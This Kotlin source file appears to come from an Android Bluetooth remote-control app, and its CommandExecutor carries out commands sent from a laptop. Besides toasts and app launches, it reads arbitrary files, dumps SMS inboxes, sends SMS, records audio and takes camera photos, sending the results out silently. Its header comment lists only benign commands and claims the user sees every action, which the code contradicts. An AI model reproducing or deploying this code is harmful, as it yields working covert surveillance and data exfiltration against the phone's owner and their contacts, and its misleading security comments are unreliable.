package com.example.btremote

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.os.BatteryManager
import android.os.Environment
import android.telephony.SmsManager
import android.util.Log
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * Command Executor
 *
 * Executes parsed commands on the Android device.
 *
 * This class handles:
 * - Showing toast notifications
 * - Opening apps by package name
 * - Logging messages
 * - Getting device status
 *
 * Security note:
 * - Only executes actions the app has permissions for
 * - Cannot execute privileged operations
 * - User sees all actions (toasts, app launches)
 */
class CommandExecutor(
    private val context: Context,
    private val useChunking: Boolean = true,
    private val responseCallback: (String) -> Unit
) {
    
    companion object {
        private const val TAG = "BTRemote-Executor"
    }
    
    private val parser = CommandParser()
    private val audioRecorder = AudioRecorder(context)
    
    /**
     * Execute a command.
     *
     * @param jsonCommand JSON command string
     *
     * Flow:
     * 1. Parse JSON
     * 2. Validate command type
     * 3. Execute appropriate action
     * 4. Send response if needed
     */
    fun execute(jsonCommand: String) {
        val command = parser.parse(jsonCommand)
        
        if (command == null) {
            Log.e(TAG, "Failed to parse command")
            sendResponse("error", "Failed to parse command")
            return
        }
        
        if (!parser.isValidCommandType(command.type)) {
            Log.e(TAG, "Unknown command type: ${command.type}")
            sendResponse("error", "Unknown command type: ${command.type}")
            return
        }
        
        Log.i(TAG, "Executing command: ${command.type}")
        
        when (command.type) {
            CommandParser.CMD_SHOW_TOAST -> executeShowToast(command.payload)
            CommandParser.CMD_OPEN_APP -> executeOpenApp(command.payload)
            CommandParser.CMD_LOG_ACTION -> executeLogAction(command.payload)
            CommandParser.CMD_GET_STATUS -> executeGetStatus()
            CommandParser.CMD_LIST_FILES -> executeListFiles(command.payload)
            CommandParser.CMD_SEND_SMS -> executeSendSms(command.payload)
            CommandParser.CMD_LIST_SMS -> executeListSms(command.payload)
            CommandParser.CMD_AUDIO_CONTROL -> executeAudioControl(command.payload)
            CommandParser.CMD_OPEN_FILE -> executeOpenFile(command.payload)
            CommandParser.CMD_COPY_FILE -> executeCopyFile(command.payload)
            CommandParser.CMD_READ_FILE -> executeReadFile(command.payload)
            CommandParser.CMD_START_RECORD -> executeStartRecord()
            CommandParser.CMD_STOP_RECORD -> executeStopRecord()
            CommandParser.CMD_TAKE_PHOTO -> executeTakePhoto(command.payload)
            CommandParser.CMD_TAKE_SCREENSHOT -> executeTakeScreenshot()
            else -> {
                Log.w(TAG, "Unknown command: ${command.type}")
                sendResponse("error", "Unknown command: ${command.type}")
            }
        }
    }

    private fun executeReadFile(payload: JSONObject) {
        val path = payload.optString("path")
        if (path.isEmpty()) {
            sendResponse("error", "Path is required")
            return
        }

        try {
            val file = File(path)
            if (!file.exists()) {
                sendResponse("error", "File not found")
                return
            }
            
            if (file.length() > 5 * 1024 * 1024) { // 5MB limit
                sendResponse("error", "File too large (>5MB)")
                return
            }

            val bytes = file.readBytes()
            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            
            val response = JSONObject()
            response.put("path", path)
            response.put("data", base64)
            
            sendResponse("file_data", response.toString())
            
        } catch (e: Exception) {
            Log.e(TAG, "Error reading file", e)
            sendResponse("error", "Failed to read file: ${e.message}")
        }
    }

    private fun executeOpenFile(payload: JSONObject) {
        val path = payload.optString("path")
        if (path.isEmpty()) {
            sendResponse("error", "Path is required")
            return
        }

        try {
            val file = File(path)
            if (!file.exists()) {
                sendResponse("error", "File not found")
                return
            }

            // Hack to allow file:// URIs
            val builder = android.os.StrictMode.VmPolicy.Builder()
            android.os.StrictMode.setVmPolicy(builder.build())

            val intent = Intent(Intent.ACTION_VIEW)
            intent.setDataAndType(android.net.Uri.fromFile(file), "*/*")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            
            // Try to guess mime type based on extension
            val extension = android.webkit.MimeTypeMap.getFileExtensionFromUrl(android.net.Uri.fromFile(file).toString())
            val mimeType = android.webkit.MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension)
            if (mimeType != null) {
                intent.setDataAndType(android.net.Uri.fromFile(file), mimeType)
            }

            context.startActivity(intent)
            sendResponse("success", "Opened file: $path")
        } catch (e: Exception) {
            Log.e(TAG, "Error opening file", e)
            sendResponse("error", "Failed to open file: ${e.message}")
        }
    }

    private fun executeCopyFile(payload: JSONObject) {
        val sourcePath = payload.optString("source")
        val destPath = payload.optString("dest")
        
        if (sourcePath.isEmpty() || destPath.isEmpty()) {
            sendResponse("error", "Source and destination paths required")
            return
        }

        try {
            val source = File(sourcePath)
            val dest = File(destPath)

            if (!source.exists()) {
                sendResponse("error", "Source file not found")
                return
            }

            source.copyTo(dest, overwrite = true)
            sendResponse("success", "Copied to $destPath")
        } catch (e: Exception) {
            Log.e(TAG, "Error copying file", e)
            sendResponse("error", "Failed to copy: ${e.message}")
        }
    }

    /**
     * Execute list SMS command.
     */
    private fun executeListSms(payload: JSONObject) {
        // Default to 50 if not specified, or use provided limit
        // If limit is -1, list all (or a very large number)
        var limit = payload.optInt("limit", 50)
        if (limit == -1) limit = 1000 // Safety cap
        
        Log.i(TAG, "Listing SMS, limit: $limit")
        
        if (context.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendResponse("error", "Permission denied: READ_SMS")
            return
        }
        
        try {
            val smsList = JSONArray()
            val cursor = context.contentResolver.query(
                android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf("address", "body", "date"),
                null,
                null,
                "date DESC LIMIT $limit"
            )
            
            cursor?.use {
                val addressIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                
                while (it.moveToNext()) {
                    val smsObj = JSONObject()
                    smsObj.put("address", it.getString(addressIdx))
                    smsObj.put("body", it.getString(bodyIdx))
                    smsObj.put("date", it.getLong(dateIdx))
                    smsList.put(smsObj)
                }
            }
            
            val response = JSONObject()
            response.put("messages", smsList)
            response.put("count", smsList.length())
            
            sendResponse("list_sms", response.toString())
            
        } catch (e: Exception) {
            Log.e(TAG, "Error listing SMS", e)
            sendResponse("error", "Failed to list SMS: ${e.message}")
        }
    }
    /**
     * Show toast notification.
     *
     * Payload:
     * {
     *   "message": "Hello!",
     *   "duration": "short" | "long"
     * }
     *
     * Under the hood:
     * - Toast.makeText() creates toast
     * - Toast is queued in system toast queue
     * - Displayed for 2s (short) or 3.5s (long)
     * - Must run on main thread (we handle this)
     */
    private fun executeShowToast(payload: JSONObject) {
        val message = payload.optString("message", "No message")
        val durationStr = payload.optString("duration", "short")
        
        val duration = if (durationStr == "long") {
            Toast.LENGTH_LONG
        } else {
            Toast.LENGTH_SHORT
        }
        
        // Toast must be shown on main thread
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            Toast.makeText(context, message, duration).show()
            Log.i(TAG, "Toast shown: $message")
        }
        
        sendResponse("success", "Toast shown")
    }
    
    /**
     * Open an app by package name.
     *
     * Payload:
     * {
     *   "package": "com.android.chrome"
     * }
     *
     * Under the hood:
     * - PackageManager.getLaunchIntentForPackage() gets launch intent
     * - Intent is the standard app launcher intent
     * - startActivity() launches the app
     * - If app not installed, returns null
     *
     * Security:
     * - Can only launch apps user can launch manually
     * - No privilege escalation
     * - User sees app launch
     */
    private fun executeOpenApp(payload: JSONObject) {
        val packageName = payload.optString("package", "")
        
        if (packageName.isEmpty()) {
            Log.e(TAG, "Empty package name")
            sendResponse("error", "Empty package name")
            return
        }
        
        try {
            val packageManager = context.packageManager
            val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
            
            if (launchIntent == null) {
                Log.e(TAG, "App not found: $packageName")
                sendResponse("error", "App not found: $packageName")
                return
            }
            
            // Add flags to start app in new task
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            
            context.startActivity(launchIntent)
            Log.i(TAG, "Launched app: $packageName")
            sendResponse("success", "Launched app: $packageName")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error launching app: $packageName", e)
            sendResponse("error", "Error launching app: ${e.message}")
        }
    }
    
    /**
     * Log a message.
     *
     * Payload:
     * {
     *   "message": "Test log"
     * }
     *
     * Under the hood:
     * - Log.i() writes to Android logcat
     * - Visible via: adb logcat | grep BTRemote
     * - Logs are buffered in kernel ring buffer
     * - Can be viewed in real-time or historically
     */
    private fun executeLogAction(payload: JSONObject) {
        val message = payload.optString("message", "No message")
        
        Log.i(TAG, "LOG ACTION: $message")
        sendResponse("success", "Logged: $message")
    }
    
    /**
     * Get device status.
     *
     * Returns device information:
     * - Battery level
     * - Current time
     * - Android version
     * - Device model
     *
     * Under the hood:
     * - BatteryManager provides battery info
     * - Build class provides device info
     * - Response sent via BLE notification
     */
    private fun executeGetStatus() {
        try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            val currentTime = dateFormat.format(Date())
            
            val status = JSONObject().apply {
                put("battery", batteryLevel)
                put("time", currentTime)
                put("android_version", android.os.Build.VERSION.RELEASE)
                put("device_model", android.os.Build.MODEL)
                put("manufacturer", android.os.Build.MANUFACTURER)
            }
            
            val statusString = status.toString()
            Log.i(TAG, "Device status: $statusString")
            sendResponse("status", statusString)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error getting device status", e)
            sendResponse("error", "Error getting status: ${e.message}")
        }
    }
    
    /**
     * Send response back to laptop.
     *
     * Response format:
     * {
     *   "status": "success" | "error" | "status",
     *   "message": "..."
     * }
     */
    /**
     * Send response back to laptop.
     *
     * Response format:
     * {
     *   "status": "success" | "error" | "status",
     *   "message": "..."
     * }
     * 
     * Handles chunking for large responses.
     * Format: CHUNK:{seq}/{total}:{data}
     */
    private fun sendResponse(status: String, message: String) {
        val response = JSONObject().apply {
            put("status", status)
            put("message", message)
            put("timestamp", System.currentTimeMillis())
        }
        
        val jsonString = response.toString()
        
        if (!useChunking) {
            responseCallback(jsonString)
            return
        }
        
        val bytes = jsonString.toByteArray(Charsets.UTF_8)
        val totalLen = bytes.size
        val maxChunk = 180 
        
        if (totalLen <= maxChunk) {
            responseCallback(jsonString)
        } else {
            var offset = 0
            var seq = 1
            val totalChunks = (totalLen + maxChunk - 1) / maxChunk
            
            while (offset < totalLen) {
                val end = (offset + maxChunk).coerceAtMost(totalLen)
                val chunkData = String(bytes, offset, end - offset, Charsets.UTF_8)
                val header = "CHUNK:$seq/$totalChunks:"
                responseCallback(header + chunkData)
                offset += maxChunk
                seq++
                
                try { Thread.sleep(20) } catch (e: Exception) {}
            }
        }
    }

    /**
     * Execute list files command.
     */
    private fun executeListFiles(payload: JSONObject) {
        val path = payload.optString("path", "/sdcard")
        Log.i(TAG, "Listing files in: $path")
        
        val hasPermission = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }

        if (!hasPermission) {
            sendResponse("error", "Permission denied: Storage access required")
            return
        }
        
        try {
            val directory = File(path)
            if (!directory.exists() || !directory.isDirectory) {
                sendResponse("error", "Directory not found: $path")
                return
            }
            
            val files = directory.listFiles()
            val fileList = JSONArray()
            
            files?.take(20)?.forEach { file -> // Limit to 20 files for now
                val fileObj = JSONObject()
                fileObj.put("name", file.name)
                fileObj.put("is_dir", file.isDirectory)
                fileObj.put("size", file.length())
                fileList.put(fileObj)
            }
            
            val response = JSONObject()
            response.put("path", path)
            response.put("files", fileList)
            response.put("count", files?.size ?: 0)
            
            sendResponse("list_files", response.toString())
            
        } catch (e: Exception) {
            Log.e(TAG, "Error listing files", e)
            sendResponse("error", "Failed to list files: ${e.message}")
        }
    }
    
    /**
     * Execute send SMS command.
     */
    private fun executeSendSms(payload: JSONObject) {
        val number = payload.optString("number")
        val message = payload.optString("message")
        
        if (number.isEmpty() || message.isEmpty()) {
            sendResponse("error", "Missing number or message")
            return
        }
        
        Log.i(TAG, "Sending SMS to $number: $message")
        
        if (context.checkSelfPermission(android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendResponse("error", "Permission denied: SEND_SMS")
            return
        }
        
        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(number, null, message, null, null)
            sendResponse("success", "SMS sent to $number")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending SMS", e)
            sendResponse("error", "Failed to send SMS: ${e.message}")
        }
    }
    
    /**
     * Execute audio control command.
     */
    private fun executeAudioControl(payload: JSONObject) {
        val action = payload.optString("action")
        val value = payload.optInt("value", -1)
        
        Log.i(TAG, "Audio control: $action, value: $value")
        
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            
            when (action) {
                "set_volume" -> {
                    if (value in 0..100) {
                        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                        val targetVolume = (value / 100.0 * maxVolume).toInt()
                        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0)
                        sendResponse("success", "Volume set to $value%")
                    } else {
                        sendResponse("error", "Invalid volume value (0-100)")
                    }
                }
                "volume_up" -> {
                    audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
                    sendResponse("success", "Volume increased")
                }
                "volume_down" -> {
                    audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
                    sendResponse("success", "Volume decreased")
                }
                else -> {
                    sendResponse("error", "Unknown audio action: $action")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error controlling audio", e)
            sendResponse("error", "Failed to control audio: ${e.message}")
        }
    }

    private fun executeStartRecord() {
        if (context.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendResponse("error", "Permission denied: RECORD_AUDIO")
            return
        }
        val path = audioRecorder.startRecording()
        if (path != null) {
            sendResponse("success", "Recording started")
        } else {
            sendResponse("error", "Failed to start recording")
        }
    }

    private fun executeStopRecord() {
        val path = audioRecorder.stopRecording()
        if (path != null) {
            val response = JSONObject()
            response.put("path", path)
            sendResponse("recording_finished", response.toString())
        } else {
            sendResponse("error", "Failed to stop recording or no active recording")
        }
    }

    private fun executeTakePhoto(payload: JSONObject) {
        if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendResponse("error", "Permission denied: CAMERA")
            return
        }

        val camera = payload.optString("camera", "rear")
        val useFrontCamera = camera == "front"

        val cameraManager = CameraManager(context)
        cameraManager.takePhoto(useFrontCamera) { file ->
            if (file != null) {
                // Automatically send the photo via existing file transfer
                val filePayload = JSONObject()
                filePayload.put("path", file.absolutePath)
                executeReadFile(filePayload)
            } else {
                sendResponse("error", "Failed to capture photo")
            }
        }
    }

    private fun executeTakeScreenshot() {
        // Screenshot requires MediaProjection permission
        // This is handled in MainActivity
        sendResponse("error", "Screenshot requires user permission. Use the Android app to grant permission first.")
    }
}
